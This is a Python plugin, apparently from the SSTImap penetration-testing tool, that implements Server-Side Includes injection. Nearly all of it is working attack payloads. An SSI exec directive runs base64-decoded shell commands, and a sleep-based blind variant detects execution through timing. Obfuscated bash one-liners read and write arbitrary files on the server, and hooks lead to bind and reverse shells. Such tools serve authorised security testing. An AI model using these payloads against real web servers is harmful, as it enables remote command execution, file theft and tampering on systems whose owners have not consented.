from core.plugin import Plugin
from core import bash
from utils import closures
from utils import rand


class SSI(Plugin):
    legacy_plugin = True
    formatter = "sstimap"
    header_type = "cat"
    priority = 9
    plugin_info = {
        "Description": """Server-Side Includes injection""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Initial SSTImap plugin
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': """SSTIMAP:code;""",
                'header': """<!--#set var="h" value="SSTIMAP:header:get,1;" -->SSTIMAP:header:get,0;<!--#echo var="h" -->""",
                'trailer': """<!--#set var="t" value="SSTIMAP:trailer:get,1;" -->SSTIMAP:trailer:get,0;<!--#echo var="t" -->""",
                'test_render': f"""<!--#set var="b" value="{rand.randstrings[1]}" -->{rand.randstrings[0]}<!--#echo var="b" -->""",
                'test_render_expected': f'{rand.randstrings[0]}{rand.randstrings[1]}'
            },
            # No error-based or boolean-based, as SSI do not produce user-controlled errors and fail silently
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'execute': {
                'execute': """<!--#exec cmd="`echo 'SSTIMAP:code:b64;'|base64 -d`" -->""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2],
                'test_os': """uname""",
                'test_os_expected': r'^[\w-]+$'
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """<!--#exec cmd="`echo 'SSTIMAP:code:b64;'|base64 -d`&&sleep SSTIMAP:delay;" -->"""
            },
            'read': {
                'call': 'execute',
                'read': """base64<'SSTIMAP:path;'"""
            },
            'write': {
                'call': 'execute',
                'write': """bash -c {tr,_-,/+}<<<SSTIMAP:chunk:b64u;|{base64,-d}>>SSTIMAP:path;""",
                'truncate': """bash -c {echo,-n,}>SSTIMAP:path;""",
            },
            'md5': {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'SSTIMAP:path;'|head -c 32"""
            },
            'bind_shell': {
                'call': 'execute_blind'
            },
            'reverse_shell': {
                'call': 'execute_blind'
            }
        })

        self.set_contexts([
            {'level': 0},
            # SSI shares tag endings with HTML comment
            {'level': 1, 'prefix': 'SSTIMAP:closure; -->', 'suffix': '<!-- a', 'closures': ctx_closures},
        ])

    language = 'SSI'


ctx_closures = {
        1: [
            closures.close_double_quotes + closures.empty
        ],
        2: [
            closures.close_double_quotes + closures.empty
        ],
        3: [
            closures.close_double_quotes + closures.empty
        ],
        4: [
            closures.close_double_quotes + closures.empty
        ],
        5: [
            closures.close_double_quotes + closures.empty
        ]
}
